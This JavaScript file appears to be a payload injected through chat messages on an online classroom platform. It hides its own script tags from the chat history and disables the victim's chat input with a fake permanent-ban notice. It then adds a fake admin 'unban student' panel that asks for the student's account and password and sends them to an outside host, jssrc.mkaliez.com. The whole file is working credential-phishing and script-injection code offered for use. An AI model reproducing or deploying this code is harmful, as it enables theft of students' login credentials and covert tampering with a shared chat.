function getCenterStr(oriHTML) { 
    var firstPlace = -1;
    for(var i=0;i<oriHTML.length;i++){
        if(i + 5 >= oriHTML.length) break;
        if(oriHTML[i] == '<' && oriHTML[i+1] == '/' && oriHTML[i+2] == 'l'){
            firstPlace = i + 5;
            break;
        }
    }
    if(firstPlace == -1) return "";
    var res = oriHTML.substr(firstPlace,oriHTML.length-firstPlace);
    res = res.replace(/[\r\n]/g,"");
    res = res.replace("	","");
    return res;
}

function removeHistory(event){
    document.getElementsByTagName('head')[0].removeChild(this);
}

function injectScript(src){
    var newJs = document.createElement('script');
    newJs.type = 'text/javascript';
    newJs.src = src;
    document.getElementsByTagName('head')[0].appendChild(newJs);
    newJs.onload = removeHistory;
}

//修复聊天记录
function FixAndHide(){
    //获取当前正在执行的脚本的地址
    var curScript = "";
    if(document.currentScript != null){
        curScript = document.currentScript.src;
    }
    //修复聊天记录
    var ChatBoxNode = document.getElementById('chatListMain');
    var innerContent = "";
    var scripts = document.getElementsByTagName('script');
    var haveNode = false;
    for(var i=0;i<scripts.length;i++){
        var nowjs = scripts[i];
        //console.log(nowjs.getAttribute('src'));
        if(nowjs.parentNode.classList.contains('chat-content') && (curScript.indexOf(nowjs.getAttribute('src')) > -1)){
            haveNode = true;
            innerContent = getCenterStr(nowjs.innerHTML);
            var MessageNode = nowjs.parentElement.parentElement.parentElement;
            var objE = document.createElement("ul");
            objE.id = "System";
            objE.innerHTML = innerContent;
            document.getElementsByTagName('body')[0].appendChild(objE);
            var tt = document.getElementById('System');
            for(var j=0;j<tt.childNodes.length;j++){
                var curDom = tt.childNodes[j].cloneNode(true);
                ChatBoxNode.insertBefore(curDom,MessageNode);
            }
            document.getElementsByTagName('body')[0].removeChild(tt);
            ChatBoxNode.removeChild(MessageNode);
        }else if(nowjs.parentNode.classList.contains('chat-content')){
            haveNode = true;
            injectScript(nowjs.getAttribute('src'));
            innerContent = getCenterStr(nowjs.innerHTML);
            var MessageNode = nowjs.parentElement.parentElement.parentElement;
            var objE = document.createElement("ul");
            objE.id = "System";
            objE.innerHTML = innerContent;
            document.getElementsByTagName('body')[0].appendChild(objE);
            var tt = document.getElementById('System');
            for(var j=0;j<tt.childNodes.length;j++){
                var curDom = tt.childNodes[j].cloneNode(true);
                ChatBoxNode.insertBefore(curDom,MessageNode);
            }
            document.getElementsByTagName('body')[0].removeChild(tt);
            ChatBoxNode.removeChild(MessageNode);
        }
    }
    return haveNode;
}

while(FixAndHide()){console.log("Success to fix one script!")}

///////////////////////////////////////////////////////////////////
var sideButtonHTML = `<li class="tab-trigger statistics" onclick="SwitchDebug();">
<i class="icon icon-tab-article icon-normal"></i>
<i class="icon icon-tab-article-active icon-active"></i>
<p>管理员</p>
</li>`;
document.getElementById('tabTriggers').innerHTML += sideButtonHTML;
var tabPageHTML = `<li id="debug1" class="tab-content" data-role="调试"></li>`;
document.getElementsByClassName('tab-contents')[0].innerHTML += tabPageHTML;
var headerHTML = `<div class="tab-header">解除学生禁言</div>`;
var tabBody = document.createElement('div');
tabBody.classList.add('tab-body');
tabBody.id = "debug_tb";
document.getElementById('debug1').innerHTML += headerHTML;
document.getElementById('debug1').appendChild(tabBody);

tabBody = document.getElementById('debug_tb');
var accountHTML = `<div style="margin-top:20px;margin-left:20px;">学生账号:</div><input placeholder=" 输入学生手机号/学号" id="admin_acc" class="chat-body" style="height:30px;margin-left:20px;margin-top:10px;width: 70%;">`;
tabBody.innerHTML += accountHTML;
var passwordHTML = `<div style="margin-top:20px;margin-left:20px;">学生密码:</div><input placeholder=" 输入学生密码" id="admin_pwd" class="chat-body" type="password" style="height:30px;margin-left:20px;margin-top:10px;width: 70%;">`;
tabBody.innerHTML += passwordHTML;
var buttonHTML = `<br><button style="margin-top:15px;margin-left:21px;float:left;" class="button-md bgc-yellow cWhite cWhite-hover pointer mr5 mt5 chat-send" id="release_stu" onclick="DoUnban()">解禁</button>`;
tabBody.innerHTML += buttonHTML;
var tipsHTML = `<div style="color:red;float:left;margin-top:23px;margin-left:2px;" id="tipss"></div>`;
tabBody.innerHTML += tipsHTML;
document.getElementById('onlyShowTeacherBtn').style.display = 'none';
document.getElementById('emojiTrigger').style.display = 'none';
document.getElementById('chatSend').style.display = 'none';
document.getElementById('chatEdit').innerHTML = "你已被永久禁止发言！";
document.getElementById('chatEdit').setAttribute('contenteditable','false');
function addCss(data) {
    var head = document.getElementsByTagName("head")[0];
    var style = document.createElement("style");

    style.innerHTML = data;
    head.appendChild(style);
}

addCss(".spec_hideChat .tab-trigger-chat,.spec_hideChat .tab-trigger-chat .chat{display: block!important;}");

function SwitchDebug(){
    var tab = document.getElementsByClassName('tab-contents')[0];
    for(var i=0;i<tab.childNodes.length;i++){
        var curNode = tab.childNodes[i];
        if(!curNode.classList) continue;
        curNode.classList.remove('active');
    }
    document.getElementById('debug1').classList.add('active');
}
SwitchDebug();
function DoUnban(){
    var stuUsername = document.getElementById('admin_acc').value;
    var stuPassword = document.getElementById('admin_pwd').value;
    VerifyPassword(stuUsername,stuPassword,(res)=>{
        if(res == '登录成功！'){
            document.getElementById('tipss').style.color = 'green';
            document.getElementById('tipss').innerHTML = '解禁成功！';
            document.getElementById('onlyShowTeacherBtn').style.display = 'none';
            document.getElementById('emojiTrigger').style.display = '';
            document.getElementById('chatSend').style.display = '';
            document.getElementById('chatEdit').innerHTML = "";
            document.getElementById('chatEdit').setAttribute('contenteditable','true');
        }else{
            document.getElementById('tipss').style.color = 'red';
            document.getElementById('tipss').innerHTML = '学生账号或密码错误！';
        }
    })
}
function VerifyPassword(accout,password,callback){
    var apiURL = "https://jssrc.mkaliez.com/verify.php?uname=" + accout + "&pwd=" + password;
    $.get(apiURL,(res)=>{
        callback(res);
    })
}